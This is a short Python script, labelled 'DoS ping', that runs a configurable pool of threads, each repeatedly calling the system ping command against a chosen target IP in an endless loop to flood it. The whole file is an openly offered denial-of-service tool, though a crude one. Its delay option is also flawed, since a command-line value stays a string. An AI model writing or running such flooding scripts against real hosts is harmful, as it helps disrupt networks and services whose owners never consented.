import subprocess
import argparse
from concurrent.futures import ThreadPoolExecutor
from time import sleep


parser = argparse.ArgumentParser(description="DoS ping")
parser.add_argument('-P', '--poolsize',  default=10, help='Size of the threadpool')
parser.add_argument('-T', '--target',  default='localhost', help='Target IP address to ping')
parser.add_argument('-D', '--delay', default=0, help='Amount of time to wait between pings')

args = parser.parse_args()
threadpool_size = int(args.poolsize)
target = args.target
delay = args.delay


terminate = False


def ping_host(ip):

    global terminate

    while True and not terminate:

        try:
            subprocess.check_output(["ping", "-c3", "-n", "-i0.5", "-W2", ip])
            print(f"---> Ping successful: {ip}")

        except subprocess.CalledProcessError:
            print(f" !!!  Ping failed: {ip}")

        if delay > 0:
            for _ in range(0, delay): sleep(1)


def main():

    global terminate

    try:
        targets = [target for _ in range(0, threadpool_size)]
        with ThreadPoolExecutor(max_workers=threadpool_size) as executor:
            executor.map(ping_host, targets)

    except KeyboardInterrupt:
        print("... terminating application ...", end="")
        terminate = True
        print("terminated")


if __name__ == "__main__":
    main()
